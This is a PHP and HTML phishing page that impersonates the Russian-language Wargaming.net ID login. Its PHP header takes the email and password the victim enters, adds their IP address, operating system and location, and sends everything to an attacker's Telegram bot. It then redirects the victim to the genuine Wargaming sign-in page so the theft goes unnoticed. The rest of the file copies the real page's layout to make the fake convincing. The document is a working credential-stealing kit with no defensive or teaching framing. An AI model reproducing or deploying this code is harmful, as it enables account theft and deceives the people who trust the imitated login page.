<?php

    error_reporting(0);
    include './config.php';

    if (!empty($_POST["login"] && $_POST["password"])) {
        $os = getOS();
        [$ip, $country, $region, $city] = getIP();

        $text = "| <b>🛎 Новый лог!</b> |\n";
        $text.= "- <b>Эл. Почта</b> | <code>{$_POST['login']}</code>\n";
        $text.= "- <b>Пароль</b> | <code>{$_POST['password']}</code>\n";
        $text.= "| <b>🖥 Девайс</b> |\n";
        $text.= "- <b>IP</b> | <code>{$ip}</code>\n";
        $text.= "- <b>OS</b> | <code>{$os}</code>\n";
        $text.= "| <b>📡 GEO</b> |\n";
        $text.= "- <b>Страна</b> | <code>{$country}</code>\n";
        $text.= "- <b>Регион</b> | <code>{$region}</code>\n";
        $text.= "- <b>Город</b> | <code>{$city}</code>";

        $text = urlencode($text);

        file_get_contents("https://api.telegram.org/bot{$token}/sendMessage?text={$text}&chat_id={$chat_id}&parse_mode=HTML");

        header("Location: https://eu.wargaming.net/id/signin/");
    }
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Wargaming.net ID</title>
    <link rel="stylesheet" href="css/styles.css">
    <link rel="shortcut icon" href="images/favicon.ico" type="image/x-icon">
</head>
<body>
    <header class="header">
        <div class="header-inner">
            <div class="header-item">
                <div class="logo">
                    <a href="index.html">
                    <svg width="19px" height="19px" version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px"
                        viewBox="0 0 19 19" enable-background="new 0 0 19 19" xml:space="preserve">
                        <path fill-rule="evenodd" clip-rule="evenodd" fill="#707273" d="M1.8,9.5c0-4.3,3.4-7.7,7.7-7.7c4.2,0,7.7,3.4,7.7,7.7
                            c0,2.8-1.5,5.3-3.8,6.6c0.5-1.7,0.7-3.4,0.6-5.4c0.5,0.1,0.8,0.2,1.3,0.4c-0.6-1.4-1.2-2.8-2-4.1c-0.7,1.4-1.7,2.7-2.7,3.7l1.6-0.1
                            c-1.4,2.5-3.3,3.6-5.8,4c-0.6-2.7-0.2-7.3,3-9.4l0.3,1.5c0.6-1,1.8-2.3,2.7-3.2C11,3.1,9.4,2.9,7.8,3.2C8,3.4,8.4,3.7,8.6,3.9
                            c-3.5,1.5-5.5,3.9-6.7,6.8C1.8,10.3,1.8,9.9,1.8,9.5L1.8,9.5z M9.5,19c5.2,0,9.5-4.3,9.5-9.5C19,4.3,14.7,0,9.5,0S0,4.3,0,9.5
                            C0,14.7,4.3,19,9.5,19L9.5,19z"/>
                    </svg>
                    </a>
                </div>
                <div class="nav-links">
                    <a href="#">Игры
                    <svg width="13" height="8" viewBox="0 0 13 8" xmlns="http://www.w3.org/2000/svg">
                        <path d="M5.87584 7.25487C6.22056 7.58171 6.77943 7.58171 7.12414 7.25487L12.7415 1.92872C13.0862 1.60188 13.0862 1.07197 12.7415 0.745129C12.3967 0.418291 11.8379 0.418291 11.4932 0.745129L6.49999 5.47949L1.50683 0.745129C1.16211 0.41829 0.603237 0.41829 0.25853 0.745129C-0.0861766 1.07197 -0.0861766 1.60188 0.25853 1.92872L5.87584 7.25487ZM5.61732 5.82615V6.66308H7.38267V5.82615H5.61732Z" fill="#121128"/>
                        </svg>                        
                    </a>
                </div>
                <div class="nav-links">
                    <a href="#">Сервисы
                         <svg width="13" height="8" viewBox="0 0 13 8" xmlns="http://www.w3.org/2000/svg">
                            <path d="M5.87584 7.25487C6.22056 7.58171 6.77943 7.58171 7.12414 7.25487L12.7415 1.92872C13.0862 1.60188 13.0862 1.07197 12.7415 0.745129C12.3967 0.418291 11.8379 0.418291 11.4932 0.745129L6.49999 5.47949L1.50683 0.745129C1.16211 0.41829 0.603237 0.41829 0.25853 0.745129C-0.0861766 1.07197 -0.0861766 1.60188 0.25853 1.92872L5.87584 7.25487ZM5.61732 5.82615V6.66308H7.38267V5.82615H5.61732Z" fill="#121128"/>
                        </svg>    
                    </a>
                </div>
                <div class="nav-links orange-link">
                    <a href="#">Премиум магазин</a>
                </div>
                <div class="nav-links">
                    <a href="#">Центр поддержки</a>
                </div>
            </div>

            <div class="header-item"> 
                <div class="nav-links">
                    <a class="nav-link" href="#">Создать аккаунт</a>
                    <a href="#"><img class="nav-user" src="images/user.svg" alt="user"></a>
                </div>
            </div>

        </div>
    </header>

    <div class="intro">
        <div class="intro-logo">
            <img src="images/wg_logo_airy.png" alt="">
        </div>
    </div>

    <div class="signup">
        <h1 class="sign-title">ВХОД В АККАУНТ</h1>
        <div class="sign-text">
            Эта страница — единое место входа в ваш аккаунт. Используйте её для авторизации на всех веб-ресурсах Wargaming.net. Чтобы избежать взлома аккаунта, не вводите логин и пароль на других страницах.
        </div>


        <div class="form">

            <div class="form-item">
                <div class="sign-text">Для входа используйте свой аккаунт Wargaming.net</div>
               
                <div id="error-messages" class="warning"><img src="images/message-warning-ico.png" alt="warning"></div>
                <form method="post" class="email-form">
                    <input name="login" id="email" class="email-input" type="email" placeholder="Электронная почта" required>
                </form>
                <form method="post" class="password-form">
                    <input name="password" id="password" class="password-input" type="password" placeholder="Пароль" required>
                </form>

                <div class="check">
                    <button class="login-btn" id="login-button">Войти</button>
                    <div class="checkbox">
                        <input class="remember" type="checkbox" id="remember-me">
                        <label class="remember-label" for="remember-me">Запомнить меня</label>
                    </div>
                </div>

                <div class="login-text order1">
                    Не удаётся войти?<a href="index.html"> Восстановить аккаунт</a>
                </div>
                <div class="login-text order3">
                    Нет Wargaming.net ID?<a href="index.html"> Создать аккаунт</a>
                </div>
            </div>

            <div class="form-item">
                <div class="sign-text sign-text2">Войдите с помощью социальной сети:</div>

                <div class="social-buttons">
                    <a href="#" class="social-btn amazon"><img src="images/icon_amazon-d.svg" alt="">Amazon</a>
                    <a href="#" class="social-btn facebook"><img src="images/icon_facebook-c.svg" alt="">Facebook</a>
                    <a href="#" class="social-btn google"><img src="images/icon_google-d.svg" alt=""><p class="text-center">Google</p></a>
                    <a href="#" class="social-btn microsoft"><img src="images/icon_live-d.svg" alt="">Microsoft</a>
                    <a href="#" class="social-btn twitch"><img src="images/icon_twitch-d.svg" alt="">Twitch</a>
                    <a href="#" class="social-btn steam"><img src="images/icon_steam-d.svg" alt="">Steam</a>
                    <a href="#" class="social-btn epic-games"><img src="images/icon_egs-d.svg" alt="">Epic Games</a>
                </div>
                <div class="login-text order">
                    Нет Wargaming.net ID?<a href="index.html"> Создать аккаунт</a>
                </div>
            </div>
        </div>


    </div>

    <footer class="footer">
        <div class="footer-container">
            <div class="footer-row">
                <div class="footer-item footer1">
                    <a href="#" class="footer-link">Лицензионное соглашение</a>
                    <a href="#" class="footer-link">Политика конфиденциальности</a>
                    <a href="#" class="footer-link">Условия использования</a>
                    <a href="#" class="footer-link">Родительский кабинет</a>
                </div>

                <div class="footer-item footer-item2">
                    <a href="#" class="footer-link lang">Europe (Русский) </a>
                </div>
            </div>

            <div class="footer-text footer2">© 2009–2023 Wargaming.net Все права защищены</div>
            <div class="footer-item footer3">
                <a href="#" class="footer-link lang">Europe (Русский) </a>
            </div>
        </div>
    </footer>

<script src="js/script.js"></script>
</body>
</html>